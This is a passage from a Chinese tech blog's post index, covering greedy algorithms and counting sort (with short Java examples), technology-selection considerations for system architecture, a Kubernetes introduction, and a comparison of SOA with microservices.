Depth of Binary Tree Lintcode - 480 Binary Tree Paths 大整数乘法 Strassen矩阵乘法 棋盘覆盖 合并排序 快速排序 线性时间选择 最接近点对问题 循环赛日程表 汉诺塔 依据分治法设计程序时的思维过程实际上就是类似于数学归纳法，找到解决本问题的求解方程公式，然后根据方程公式设计递归程序。 一定是先找到最小问题规模时的求解方法 然后考虑随着问题规模增大时的求解方法 找到求解的递归函数式后（各种规模或因子），设计递归程序即可。 Reference 五大常用算法之一：分治算法 - https://www.cnblogs.com/steven_oyj/archive/2010/05/22/1741370.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】算法思想 - 贪心算法（Greedy Algorithm）","date":"2019-08-05T14:16:57.000Z","path":"2019/08/05/【Algorithm】算法思想-贪心算法/","text":"贪心算法（Greedy Algorithm）贪心算法（Greedy Algorithm），又称贪婪算法，是一种在每一步选择中都采取在当前状态下最好或最优（即最有利）的选择，从而希望导致结果是最好或最优的算法。比如在旅行推销员问题中，如果旅行员每次都选择最近的城市，那这就是一种贪心算法。 贪心算法在有最优子结构的问题中尤为有效。最优子结构的意思是局部最优解能决定全局最优解。简单地说，问题能够分解成子问题来解决，子问题的最优解能递推到最终问题的最优解。 贪心算法与动态规划的不同在于它对每个子问题的解决方案都做出选择，不能回退。动态规划则会保存以前的运算结果，并根据以前的结果对当前进行选择，有回退功能。 我们能够依据贪心法的2个重要的性质去证明：贪心选择性质和最优子结构性质。 贪心选择什么叫贪心选择？从字义上就是贪心也就是目光短线。贪图眼前利益。在算法中就是仅仅依据当前已有的信息就做出选择，并且以后都不会改变这次选择（这是和动态规划法的主要差别）。 所以对于一个具体的问题。要确定它是否具有贪心选择性质，必须证明每做一步贪心选择是否终于导致问题的总体最优解。 最优子结构当一个问题的最优解包括其子问题的最优解时，称此问题具有最优子结构性质。 运用贪心策略在每一次转化时都取得了最优解。问题的最优子结构性质是该问题可用贪心算法或动态规划算法求解的关键特征。贪心算法的每一次操作都对结果产生直接影响，而动态规划则不是。贪心算法对每个子问题的解决方案都做出选择，不能回退；动态规划则会根据以前的选择结果对当前进行选择，有回退功能。动态规划主要运用于二维或三维问题，而贪心一般是一维问题。 基本思路贪心算法的基本思路是从问题的某一个初始解触发一步一步地进行，根据抹个优化测度，每一步都要确保能获得局部最优解，每一步值考虑一个数据，他的选取应该满足局部优化的条件。若下一个数据和部分最优解连载一起不再是可行解时，就不把改数据添加到部分解中，知道把所有数据枚举玩，或者不能在添加算法停止。 过程 建立数学模型来描述问题； 把求解的问题分成若干个子问题； 对每一子问题求解，得到子问题的局部最优解； 把子问题的解局部最优解合成原来解问题的一个解。 贪心算法与动态规划贪心算法往往是这种自顶向下的设计，先做出一个选择，然后再求解下一个问题，而不是自底向上解出许多子问题，然后再做出选择。 在做贪心选择时，我们直接做出当前问题中看起来最优的解，而不是考虑到子问题的解，这也是贪心算法和动态规划的不同之处，在动态规划中，我们往往每一个步骤都求做一个选择，这个选择往往依赖于子问题的解。而在贪心算法中，我们总是做出当时看来最佳的选择，然后再求解剩下唯一的子问题。贪心算法做出选择时可能会依赖于之前的选择或者子问题的解，但是绝对不依赖于将来的选择或者子问题的解。就是我们前面所说的，一个动态规划问题是自底向上的，而一个贪心算法问题是自顶向下的。 例子LeetCode 的第 122 题 Best Time to Buy and Sell Stock II： Say you have an array for which the ith element is the price of a given stock on day i. Design an algorithm to find the maximum profit. You may complete as many transactions as you like (i.e., buy one and sell one share of the stock multiple times). 贪心算法，总是做出在当前看来是最好的选择，不从整体最优上加以考虑，也就是说，只关心当前最优解，按照贪心策略，不关心以后，我们只关心当前利益。第0天买入，花费prices[0]，第一天卖出，得到prices[1]，那么我们的收获就是profit = prices[1] - prices[0]。那么有两种情况 （1）当profit &gt; 0 时，赶紧买入卖出，能赚一笔是一笔。 （2）当profit &lt;= 0 时，再买入卖出的话，那就是傻了，亏钱。 以此方式类推下去，即得最大利润。 12345678910public int maxProfit(int[] prices) &#123; int profit = 0; for (int i = 1; i &lt; prices.length; i++) &#123; int gain = prices[i] - prices[i - 1]; if (gain &gt; 0) &#123; profit += gain; &#125; &#125; return profit;&#125; 经典问题活动时间安排的问题贪心实例之线段覆盖（lines cover）数字组合问题找零钱的问题在贪心算法里面最常见的莫过于找零钱的问题了，题目大意如下，对于人民币的面值有1元 5元 10元 20元 50元 100元，下面要求设计一个程序，输入找零的钱，输出找钱方案中最少张数的方案，比如123元，最少是1张100的，1张20的，3张1元的，一共5张！ 解析：这样的题目运用的贪心策略是每次选择最大的钱，如果最后超过了，再选择次大的面值，然后次次大的面值，一直到最后与找的钱相等，这种情况大家再熟悉不过了，下面就直接看源代码： Prim 算法 和 Kruskal 算法Prim 算法 和 Kruskal 算法都是在加权无向图找到最小生成树的算法，它们也都是贪心算法。 哈夫曼编码我们可以用 01 编码串来代表一个字符，例如 a 为 0，c 为 00，f 为 1100。这样，可能因为其中一个字符的编码是另一个字符的前缀而导致歧义。满足任何一个编码都不是另一个的前缀的编码被称为前缀码（Prefix Code）。 Reference 贪心算法详解 -https://blog.csdn.net/effective_coder/article/details/8736718 贪心算法 - https://juejin.im/post/5aea722e6fb9a07ac652dbc8 贪心算法 - http://staff.ustc.edu.cn/~lszhuang/alg/ch16.pdf 算法一篇通——贪心算法 - http://kyonhuang.top/greedy-algorithm/ 【LeetCode】贪心算法–买卖股票的最佳时机 II（122） - https://segmentfault.com/a/1190000017907249 leetcode刷题（一）：贪心算法 - https://zhuanlan.zhihu.com/p/57217890","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】排序算法 - 计数排序（Counting Sort）","date":"2019-08-05T13:42:16.000Z","path":"2019/08/05/【Algorithm】排序算法-计数排序/","text":"计数排序（Counting Sort）计数排序是一种非基于比较的排序算法，计数排序的时间复杂度为 O(n + m)，m 指的是数据量，说的简单点，计数排序算法的时间复杂度约等于 O(n)，快于任何比较型的排序算法。 图解计数以下以[ 3，5，8，2，5，4 ]这组数字来演示。 首先，我们找到这组数字中最大的数，也就是 8，我们就创建一个最大下标为 8 的空数组 arr 。 遍历数据，以将数据的出现次数填入arr中对应的下标位置中（该数据的值等于arr中对应的下标）。 遍历 arr ，将数据依次取出即可。 代码实现12345678910111213141516171819202122232425public static void sort(int[] arr) &#123; //找出数组中的最大值 int max = arr[0]; for (int i = 1; i &lt; arr.length; i++) &#123; if (arr[i] &gt; max) &#123; max = arr[i]; &#125; &#125; //初始化计数数组 int[] countArr = new int[max + 1]; //计数 for (int i = 0; i &lt; arr.length; i++) &#123; countArr[arr[i]]++; arr[i] = 0; &#125; //排序 int index = 0; for (int i = 0; i &lt; countArr.length; i++) &#123; if (countArr[i] &gt; 0) &#123; arr[index++] = i; &#125; &#125;&#125; Reference 这或许是东半球讲十大排序算法最好的一篇文章 - https://cxyxiaowu.com/articles/2019/06/11/1560233679033.html https://www.geeksforgeeks.org/counting-sort/","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Architecture】系统架构考虑","date":"2019-08-05T04:16:20.000Z","path":"2019/08/05/【Architecture】系统架构考虑/","text":"技术选型技术栈从前端到后端，从缓存到数据库 前端 前端框架 Angular React 前端页面选择模板引擎还是动静分离？ 后端中间层 - 是否需要 Node.js 后端 服务端选择Java还是Node.js？ 服务治理选择DubboX还是Spring Cloud？ 是否需要使用 消息队列选择RocketMQ还是Kafka？ 数据库选择MySQL 还是Oracle？ 是否需要缓存 - 缓存选择Redis Cluster 还是 Codis？ 全文检索选择Solr还是ES？ 其他因素产品特征产品本身的特征将影响技术选型时的很多因素。 短生命周期产品和长生命周期产品 短生命周期的产品通常要求快速起步：门槛低、书写自由、不强制遵循任何最佳实践。当它的使命结束时，代码会被直接抛弃。所以，对于这类产品，“快糙猛”的技术是较好的选择，当然，能做到“快精猛”更佳。 而长生命周期的产品则会强烈要求可维护性，因为它们在很长时间内都是不可报废的。甚至对于一些生命线产品，连重写都会要求在重写期间线上系统平稳过渡，一点点迁移到新技术。 这种要求对团队的工程化能力是个极端的考验。如果没有相应的工程能力，其代价甚至会高于用新技术重新写一个功能相同的系统。 探索型的产品和守成型的产品 探索型产品往往也是短周期产品，但是同时也有自己的特点。它要求快速，但往往同时会要求高质量。探索型的产品如果证明了可行性，那么过渡到长生命周期的可能性很大。 这就要求它最好是一个微内核系统，提前留出一些扩展的空间。当然，设计微内核系统对架构师的能力具有相当的考验，如果没有一个优秀的架构师，建议还是不要刻意做任何预留，优先保障系统的简单性。 除此之外，探索型产品的技术栈必须支持可靠的、自动化的重构。因为探索型产品的迭代速度很快，如果完全靠人工去添加功能并手动重构，那么一旦出现 BUG，将给此产品的用户体验带来严重的负面影响。 所以，除非由于人才储备等原因而被迫做出折中，否则探索型产品的技术栈一定要快速而严谨。 当然，“大力出奇迹”定律也是成立的。也就是说，如果你有决心也有力量在将来对这个探索型产品进行彻底的重写，那么采用快糙猛的技术快速把它搭建起来，也未尝不可。如果你的业务确实能如预期般爆发，那么只要把重点放在系统延展性等方面即可；但是如果不能如预期般爆发，可能就会导致维护成本在中期开始飙升，在竞争中处于劣势。这是一种“不成功便成仁”的策略。据我所知某独角兽企业就是在业务起来之后通过巨额投入来偿还技术债的。但这对于 CTO 的技术直觉是一项极大的考验，不要轻易效仿。 而对守成型产品的选型则会侧重于与现有技术栈的相似程度和无缝整合能力。如果整合时需要借助很多技巧，那么可能你就是在给自己挖坑。 在引入新技术的过程中，要尽可能符合现有的开发流程、基础设施和开发习惯。当然，如果现有的这些已经严重过时，那么应该找新老技术的专家，共同帮你设计一个路线图，让你可以平稳地引入新技术，这份投资绝对值得。如果老技术已经有新版本，则应该优先考虑升级它。不要幻想换个技术栈就能解决一切问题，事实上，它带来的问题往往会更多。 边缘产品和生命线产品 在人员的学习能力和意愿允许的前提下，边缘产品是最佳的试验场，适合探索各种候选技术，试验各种激进方案，积累经验教训。其影响范围可控，即使失控也不会带来太大的损失。当然，即使探索，也应该有计划地探索，不要每个边缘产品都采用不同的技术方案，那样会给人才供应带来巨大的挑战。 而生命线产品则应该稳妥优先，采用保守方案。所以应该优先采用团队内部积累了一定经验或具有稳定的强力外援的技术。 所有的生命线产品几乎必然是长周期产品，所以其可维护性同样是重中之重。 产品维度总结 在目标产品维度上，低价值产品优先考虑门槛低的技术，但是高价值产品应该尽早进行投资性技术积累，优先考虑天花板高的技术，这样才不至于在若干年之后被迫重写。如果工程化能力不足，这种重写往往会成为灾难。 目标用户 用户的特点对于技术选型具有显著的影响，甚至可能会导致产品不可用。 浏览器版本 在前端领域，浏览器版本是永远的痛，但这是需要权衡的。高版本浏览器甚至是单一的低版本浏览器会显著节省开发成本，但是可能会损失一些用户。该怎么解决呢？当然不能拍脑袋决定。 如果你们已经有同领域的线上系统，那么应该统计这些线上系统的访问情况，得出一个最准确的、针对目标客户群的统计，然后分析一下不同版本的浏览器有多大价值，有没有可能通过非技术手段让用户使用你们的目标浏览器。即使没有线上系统，也可以随机对目标用户群发一些调查问卷，确定他们的实际使用情况，以及安装新版浏览器的可能性。 下下之策是查一下百度公布的全网浏览器数据，然后说“我们要支持某某浏览器，它还有 10% 市场占有率呢！”，这是懒。 用户带宽 同样是前端领域，文件的下载体积可能会被一些人当做亮点进行宣传，但是你要清楚，现在已经是 4G 时代了，更不用说很多企业内部应用都是千兆带宽。就算能比候选技术小 100k，在 4G 带宽下（假设现实带宽是 2MB/s）也就是 100 毫秒，有谁能感觉到这部分差异？ 这就是一个明显的“误导读者”的例子。 可访问性 在产品的用户群体中，不但有健康人，还有色盲以及盲人等残疾人。特别是对于面向消费者的产品，尽可能的考虑这些人的需求不但能体现出产品的“人文关怀”，而且也在一定程度上扩大客户群。比如苹果和微软等大公司都把可访问性放在了核心位置。如果你决定要实现可访问性，那么就应该把它作为一项需求，纳入到选型时要考虑的因素中。 之所以要把它纳入到技术选型过程中，是因为添加可访问性支持的代价比较高，而很多第三方库并没有提供这方面的支持。所以应该提早考虑。 国际化 与可访问性相似，国际化也是一个后期添加代价比较高，但很多候选技术却没有提供支持的特性。 如果你的产品在预期生命周期的相当一段时间内需要供多语言用户使用，那么，在初期选型时，就要把候选技术的国际化能力和质量纳入你的主要考量。 访问频度 用户的访问频度对前后端的技术选型都有很大影响。 比如说一个一年只用一次的功能，考虑其性能很可能是没有必要的，在一小时内跑完和在一分钟内跑完往往没有显著的价值差异。但是这两种技术方案却可能有着硬盘占用、编程复杂性、运维复杂性等方面的成本差异。你需要考虑：那种能在一分钟内跑完的技术是否能给你带来足够的价值。 对于前端来说，频繁访问的、面向消费者的应用通常会要求更高的流畅度，那么在技术选型时，就要选择流畅度更高的技术。但是这个流畅度一定要设计一个仿真的场景，亲自验证一下，甚至做一些灰度发布在现实场景下进行验证，而不要只看其官网宣称的流畅度。比如阿里的闲鱼团队就对 Flutter 技术进行了长时间的灰度验证，最终替换成了完全使用 Flutter 的版本，堪称对新技术进行选型的模范。 用户维度总结 要特别小心，不要根据错误的、片面的信息作出决策。很多第三方的技术选型指南背后都有着它们自己的场景，但大多数都不会给你写清楚，有的甚至复杂到想给你写清楚都做不到。甚至有些选型指南还有着强烈的主观立场，为了证明自己的预设立场甚至不惜造假。所以，你要先清点出你们的产品最应该重视的那些指标，然后拿这些指标对候选技术进行可行性测试，甚至为此专门开启一些 SPIKE 项目，而不要迷信第三方选型指南。 目标团队目标团队的因素确实很重要，但并不像你认为的那么重要。除非你的人才供应真的有问题（难道不应该先反思一下是不是钱给少了？），否则应该优先考虑提升团队能力，而不是削足适履。 技术背景 目标团队的技术背景对新技术的选型确实很重要，但是没必要去精确匹配。 比如 Java 团队要做前端，选择 GWT 看似很好，但 GWT 也有自己的问题，几乎完全无法利用前端生态。他们更好的选择可能是 Angular：从语言上，TypeScript 跟 Java 有诸多相似之处；从架构模式上，对 MVC 的理解稍微往前推一步就是 Angular 的 MVVM 模式；从特性上，依赖注入不要太熟悉；从生态上，你可以自由决定是否使用前端生态，取长补短。 同样，前端团队如果打算自己写 BFF，也不一定非要在 Node 生态下打转。你完全可以使用 Java 世界的 Reactor 或者 WebFlux 进行响应式编程。这样可以和后端的其它 Java 体系更好地进行集成，并减少运维的复杂度。 团队规模 团队规模可能是团队维度中对技术选型影响最大的因素。 四位开发人员以下的小规模团队，如果大家都很专业，那么其沟通成本就很低，在技术选型上可以更倾向于选择灵活的技术，因为较高的人员能力和较低的沟通成本，可以让灵活的框架更好地发挥其作用，最终更加高效、高质量的推出产品。这种场景通常出现在由牛人组成的创业团队中。 如果开发人员经验不足或者做事不够专业，就需要更强的约束，特别是对于职场新鲜人，在早期养成好的开发习惯是非常重要的。而开发习惯中最重要的一点就是：约束 —— 知道不该做什么。这时候，偏向自由的技术可能会一时爽，但最终会构筑一个玻璃天花板，导致迟迟无法突破到下一个层次。 如果团队规模过大，那么首要的选择是用 DDD 等宏观技术把问题域细分，使其可以被小规模团队承接。如果暂时还做不到，就要考虑建设完善的基础设施和交付纪律，来为团队协作提供自动化保障。如果这些都做不到，就应该选择强约束性的具体技术，让大家避免犯错，或者尽早发现错误。在争取到时间之后，再逐渐深入化解根本性原因。 组织架构 康威定律深刻地影响着很多方面，技术选型也不例外。特别是做宏观技术选型时，必须考虑它在最终技术架构中的位置，以及与团队沟通结构的匹配程度。即使是一项很先进的技术，假如它与体系中的其它技术栈不匹配，也可能导致翻车。 当选择多个第三方库的时候更要加倍小心，因为它们开发时互相不知道彼此的存在，特别是对于一些较新的技术，可能都没人把它们搭配使用过。 除了开发架构之外，还要考虑更广泛的运维架构。假如你们引入了 DevOps，可能这个问题会得到一定程度的缓解。假如没有，那就要充分考虑上下游环节的人员能力和配套设施是否完备。比如如果运维部门缺乏 NodeJS 运维技能，就不要盲目引入基于 NodeJS 的后端，一定要拿到他们“我能”的承诺之后再开始。 除非你是个前后端 + DevOps 全栈，否则就需要尽早对组织架构方面的因素进行验证并排除风险。也就是说，在一个可控的演习环境中，用一个小型案例，完整地走一遍开发、上线、发新版的流程。在这个过程中，一些显著的风险将会暴露出来，要评估其影响，来决定如何选型。 人员流动性 人员流动带来的损失比大多数人所认为的要大得多。人员流动会带走知识和文化。企业要避免损失，就要把这些知识和文化尽可能记录在代码中。 当然，这并不意味着应该要求大量写注释，而应该使用那些能留存知识的技术，比如类型系统和规范化命名。类型系统和规范化命名可以半强制性地要求开发人员把原本只存在于自己脑子里的知识记录到代码中。如果更有追求一点，可以再尝试普及单元测试。这样，当他离开的时候，即使没有文档，这些知识也仍然能留存下来。从效果上说，代码往往比文档和注释更好。 而文化的留存则更加困难，事实上，代码中的奇葩注释往往留存的是负面文化。应该在代码中留存的文化，是严谨、专业的工作态度。虽然自由也是文化的一部分，甚至在管理领域是非常值得向往的文化，但在工程领域，它往往是一种负面文化，因为软件开发领域并没有公认的法律甚至道德。你可以想象一下管理领域中没有约束的自由会导致怎样的后果。 所以，要想应对人员流动的风险，除非你有信心留存知识与文化，否则就应该在技术选型时，倾向于选择更加严谨的、隐式信息更少的技术。 团队维度总结 鞋子好不好，只有脚知道。错误的选型，也只能由团队自身来承受。阿波罗神庙上镌刻着一句警世名言——了解你自己。所以，请先客观认识自己的团队，然后再据此进行选型，千万不要懒于思考，盲从潮流。 技术本身对技术本身的考量，主要是代入其它维度之后，看其匹配程度。 技术本身在选型中可能反而是最不重要的一个维度。这些年的历史早已证明：优秀的技术未必能流行起来；很多技术的流行，也并非是由于其优秀。 明确的定位 一项优秀的技术，应该有其明确的定位和发展路线。这些定位能清楚地表明自己要做什么、不做什么。而其发展路线应该至少有一年以上的提前规划，而且在定位上要能与其前辈做出有效区隔，而不是亦步亦趋，没有自己的特长。 代码质量 虽然流行的未必优秀，优秀的也未必流行，但技术选型不是赶时髦。所以，在条件允许的情况下，还是应该尽可能选择优秀的技术。代码质量高的技术，将来技术本身由于维护成本飙升而被放弃的可能性也较小。 衡量代码质量的标准有很多，其中最常用、也比较有效的是单元测试的覆盖率。而那些从一开始就具有比较完备的单元测试的代码库，往往优于后补测试的代码库。因为这证明的是开发组的工程化能力和意识，而这些是该技术长期可维护性的根本保障。当然，除非该技术特别复杂或应用场景的容错性特别小，否则也不必苛求超过 90% 的覆盖率。 维护团队 维护团队的规模和能力，对于一项技术在长跑中的表现非常重要。在历史上如流星般划过的技术数不胜数，但最终能长期留下来的却不多。维护一项技术的成本远高于创建它，所以如果没有一个健康、可持续的商业模式，一个像 Linus 那样的志愿者，以及一个愿意出钱的超级大金主，那么它在未来的竞争中落败只是迟早的事。除非这项技术的需求集足够小而稳定，否则这些因素缺一不可。 社区 社区的质量，决定着这项技术长远的未来，一些草根型技术的隐患就在于此。如果社区人员的素质过低，喜欢无原则的站队，而不能理性的对该技术提出尖锐的意见甚至批评，那么这个社区迟早会衰落。这类社区有一个显著地特征就是喜欢宣扬它“包治百病”，也就是说它适合一切场景，而不会先问你一些问题再决定是否要推荐给你。另一个特征就是喜欢通过刻意选取某些标准来做出片面的对比，这种行为在学术界属于学术造假行为，但在我们工业界却被习以为常，这不能不说是我们的悲哀。 好的社区应该是一个君子社区。他们会自觉遵守共同的、理性的行为规范。会把精力放在对技术本身做贡献，而不是通过诡辩、群殴等手段来攻击竞争技术。社区的主要领导者会对社区的不良行为提出批评、做出约束，甚至为社区成员的不良行为道歉，而不是放任不管。 技术维度总结 不要把技术看得太重。对所有的主观性宣传文章，留一些心眼，多问一句——那缺点呢？将来决定你们是否会掉在坑里的，就是它的缺点。 对于那些会如实告诉你缺点的宣传文章，请高看一眼，因为作者是真的希望对你们团队的未来负责。 非功能性需求非功能性需求都包含哪些内容呢？ 性能（响应时间） 可扩展性（适应需求的快速变化） 可用性 （四个9，五个9，必要时的限流和降级） 安全性（防范各种恶意攻击，实现风控） 可监控（完善的监控和报警机制） 灵活性（便于非开发人员进行配置） 可维护（持续集成，持续部署） 国际化（冲出国门） Reference 技术选型指南 - https://zhuanlan.zhihu.com/p/61918951","comments":true,"categories":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/tags/Architecture/"}]},{"title":"【Distributed System】微服务 - Kubernetes 初步","date":"2019-08-04T14:33:08.000Z","path":"2019/08/04/【Distributed-System】微服务-Kubernetes/","text":"KubernetesKubernetes 是 Google 团队发起并维护的基于 Docker 的开源容器集群管理系统，它不仅支持常见的云平台，而且支持内部数据中心。 建于 Docker 之上的 Kubernetes 可以构建一个容器的调度服务，其目的是让用户透过 Kubernetes 集群来进行云端容器集群的管理，而无需用户进行复杂的设置工作。系统会自动选取合适的工作节点来执行具体的容器集群调度处理工作。其核心概念是 Container Pod。一个 Pod 由一组工作于同一物理工作节点的容器构成。这些组容器拥有相同的网络命名空间、IP以及存储配额，也可以根据实际情况对每一个 Pod 进行端口映射。此外，Kubernetes 工作节点会由主系统进行管理，节点包含了能够运行 Docker 容器所用到的服务。","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Distributed System】SOA 与 MicroServices","date":"2019-08-04T13:26:14.000Z","path":"2019/08/04/【Distributed-System】SOA与MicroService/","text":"要知道，我们对 SOA 概念的理解其实是在不断的变化。 SOA（Service Oriented Architecture，服务导向架构）从最初的 SOA 概念来说，SOA 主要为了解决一个大系统中不同子系统的相互操作性（interopearability），即为了实现这个大系统，我们希望能够复用已经存在或者说已经开发好的小系统（它们可能基于不同的编程语言，甚至运行在不同的操作系统下）。因此，这也可以描述为系统的集成（integration）问题。 因此，在那时候，我们有了 ESB （Enterprise Service Bus，企业服务总线）、WSDL、BPEL 和 SOAP 等等这些概念。它们都是为了解决系统的集成问题而诞生的。 企业服务总线（Enterprise Service Bus，ESB）企业服务总线（Enterprise Service Bus，ESB）的概念是从服务导向架构（Service Oriented Architecture， SOA）发展而来。SOA描述了一种IT基础设施的应用集成模型；其中的软构件集是以一种定义清晰的层次化结构来相互耦合。一个ESB是一个预先组装的SOA实现，它包含了实现SOA分层目标所必需的基础功能部件。 在企业计算领域，企业服务总线是指由中间件基础设施产品技术实现的、 通过事件驱动和基于XML消息引擎，为更复杂的面向服务的架构提供的软件架构的构造物。企业服务总线通常在企业消息系统上提供一个抽象层，使得集成架构师能够不用编码而是利用消息的价值完成集成工作。 需要明确的是，企业服务总线本质上解决的是一个大系统的集成问题，或者说这个大系统中不同子系统之间相互依赖的问题。 场景Background假设一下你通过银行前端的应用登入银行，会发生什么呢？ 会显示你的名字 会显示你的账号余额 会展示你的信用卡和借记卡 会列出你的共同基金 会列出一些你可能感兴趣的，预先被计算好的，有吸引力收益的借贷产品 现在，很可能所有这些模块都来自于不同的系统和应用，通过各种接口把数据展示出来 是来自在linux和Oracle的CRM系统 是来自z/OS大型机的COBOL系统 据说是来自大型机，但是他们的嘴巴很紧，不肯告诉你任何事情，只提供CSV文件。 来自跑在Windows的混合着PHP和Ruby 来自Postgresql，Python和Java，跑在Linux和Solaris的 在下图，每条不同宽度或者样式的线表示了app之间的调用 如果你觉得上面这种情况你还可以勉强维护，那下面这种情况呢？ 你可以处理400个吗？2000个怎么样？每个应用都有自己独特的生态系统，都需要用10个物理服务器或者设备跑在上面。所以，就好比有2万个移动的群体散落在大陆上，并且有着各自的技术的或者文化的边界。 所有这些群体彼此之间需要不断的，持续的交换信息，聊天，一刻也停不下来。 对这种情况，有个很好的名字，叫一团糟。 使用SOA架构，用ESB提供服务当你理解系统并不直接交换信息，理解什么是服务，那么现在你可以开始使用ESB了。 ESB的工作就是提供和调用集成系统的服务。使用了ESB，在大多情况下，每个系统和ESB之间，只需要定义一个访问方法，一个接口。如果这样，像上面的表一样，你有8个系统，就会有16个接口（1个方向1个）需要被创建、维护、管理和关注。 如果没有ESB，你就需要56个接口需要去思考和处理。（假设每个系统都需要跟其他系统对话）少了40个接口意味着少花时间和金钱。这就是你周末不用那么神经紧张的原因之一。 基于这个事实，你应该迫切地考虑需要引进ESB。 如果一个系统需要重写，改变所有者，生产商或者部门分拆，这个是ESB的工作去处理这个变更。其他的系统都甚至不需要周知，因为他们与ESB的接口不变。 SOA 的不断演化再后来，我们抛弃了基于 XML 的 SOAP，因为使用 XML 实在是太繁重（虽然 XML 有 XML schema，可以非常规范的定义 Web Service 的 IDL）。我们转而开始使用基于 RESTful（REpresentational State Transfer）风格的Web Service。 再后来，我们又由了微服务（Microservices）的概念。 这个词本身起源于2011年5月在威尼斯附近举行的软件架构师研讨会。他们第一次使用“微服务”这个术语来描述参与者看到的一个共同的架构风格，其中许多参会者都在探索相似的内容。2012年5月，同一个团队决定将“微服务”作为最合适的名称。然而实际上，微软、亚马逊、Netflix和Facebook等主要的科技公司已经在微服务架构方面工作了十多年。 乍一看，微服务架构似乎谈论的是与SOA相同的事情。不过，如果引用微软服务领域的先驱Martin Flower的话，他曾经说过，“我们应该把SOA看作微服务的超集”。 SOA 微服务架构 应用程序服务的可重用性的最大化 专注于解耦 系统性的改变需要修改整体 系统性的改变是创建一个新的服务 DevOps和持续交付正在变得流行，但还不是主流 强烈关注DevOps和持续交付 专注于业务功能重用 更重视“上下文边界”的概念 通信使用企业服务总线ESB 对于通信而言，使用较少精细和简单的消息系统 支持多种消息协议 使用轻量级协议，例如HTTP，REST或Thrift API 对部署到它的所有服务使用通用平台 应用程序服务器不是真的被使用，通常使用云平台 容器（如Docker）的使用不太受欢迎 容器在微服务方面效果很好 SOA服务共享数据存储 每个微服务可以有一个独立的数据存储 共同的治理和标准 轻松的治理，更加关注团队协作和选择自由 微服务与SOA相比，更强调分布式系统的特性，比如横向伸缩性，服务发现，负载均衡，故障转移，高可用。互联网开发对服务治理提出了更多的要求，比如多版本，比如灰度升级，比如服务降级，比如分布式跟踪，这些都是在SOA实践中重视不够的。 微服务和SOA的区别短答案：微服务是SOA发展出来的产物，它是一种比较现代化的细粒度的SOA实现方式。 微服务就是这样的一个「概念」，说白了，它不过就是近些年火起来的有一个名词而已，一时间仿佛整个行业都在讨论它，仿佛终于找到了银弹。这个时候SOA看待微服务大概就如同当年的Friendster和Myspace看待Facebook一样——大家都忘了社交网络这个东西并不是Facebook发明的。你再谈如何使用SOA去构建一个系统，就像是在谈一个过气的明星，人们会认为你已经落伍了。但真的是这样的吗？ 较早实践微服务的公司Netflix就曾经称他们构建的架构是「细粒度的SOA」 讨论「微服务和SOA的差别」的意义远不如讨论「微服务和单体系统的差别」更大，因为他们的区别实在有点微妙。此外，互联网近些年的发展，越来越朝去中心化的方向前进了，就像今天的IT工程师不需要像律师、教师那样，需要得到某些机构的认可才能更好的开展工作，这一方面意味着门槛的降低，另一方面也意味着更多的概念没有一个权威的声音来对它进行定义，使得每个人可以根据自己的需求做出不同的调整。 微服务和SOA都是这样背景下的产物，并没有一个权威的定义，来说明它们各自包含了什么东西，使用什么的方法进行系统的构建。但是，还是可以从最大的范围来对比它们的不同，当我们今天说出这两个概念时，其区别往往没有那么大，但SOA是有一定的历史了，在历史上的SOA往往意味着更多的东西，而这些是现在很多人在做架构设计时不会采用的。 SOA到微服务从SOA到微服务架构的迁移，最典型的例子就是将一个单体（Monolithic）应用重构为一个 Microservices 应用。 在单体（Monolithic）应用中，所有的功能打包在一个 WAR包里，基本没有外部依赖（除了容器），部署在一个JEE容器（Tomcat，JBoss，WebLogic）里，包含了 DO/DAO，Service，UI等所有逻辑。 而在基于微服务的架构（Microservice Architecture）中，系统中的子系统是这样的。微服务的目的是有效的拆分应用，实现敏捷开发和部署。 微服务的优势完全独立的微服务组件有助于实现完全自主的所有权，带来以下优势： 敏捷性和生产力：开发微服务的团队可以完全理解代码库。他们可以在快得多的周期中与其他组件独立地构建、部署和测试代码库。因为微服务组件只是网络上的另一个组件，所以您可以采用最适合所需功能的语言或框架来编写它，并采用最合适的持久性机制。 这种方法可显著减少要编写的代码量，使维护得到显著简化。它可以确保团队能够根据需要采用新技术或现有技术的新版本，而不是等待应用程序域的剩余部分跟上节奏。对于微服务粒度的定义，微服务组件应足够简单，以便在必要时在其下一次迭代中重写。 可伸缩性：微服务开发团队可以在运行时与其他组件独立地扩展微服务组件，实现资源的高效使用和对工作负载变化的快速反应。从理论上讲，一个组件的工作负载可以转移到对任务最合适的基础架构上。它还可以与剩余组件独立地重新放置，以便充分利用网络位置。精心编写的微服务提供了非凡的按需可伸缩性，这一领域的早期创新者和采用者已证明这一点。这些微服务也得到了最佳布置，以便充分利用弹性功能，以富有成本效益的方式访问大量资源的原生云环境。 恢复能力：独立的运行时可以立即提供与其他组件中的故障独立的恢复能力。借助小心地解耦的设计，比如避免同步依赖关系和使用断路器模式，可以编写每个微服务组件来满足自己的可用性需求，而不是在整个应用程序域中引入这些需求。容器等技术和轻量型运行时使微服务组件能够快速且独立地失败，而不是让所有不相关的功能区域都失效。同样地，它们是以一种高度无状态的方式编写的，以便可以立即重新分布工作负载并几乎同时地调出新运行时。 Reference 微服务、SOA 和 API：是敌是友？ - https://www.ibm.com/developerworks/cn/websphere/library/techarticles/1601_clark-trs/1601_clark.html 简单聊聊SOA和微服务 - https://juejin.im/post/592f87feb123db0064e5ef7c 《Web Services: Principles and Technology》 企业服务总线 - 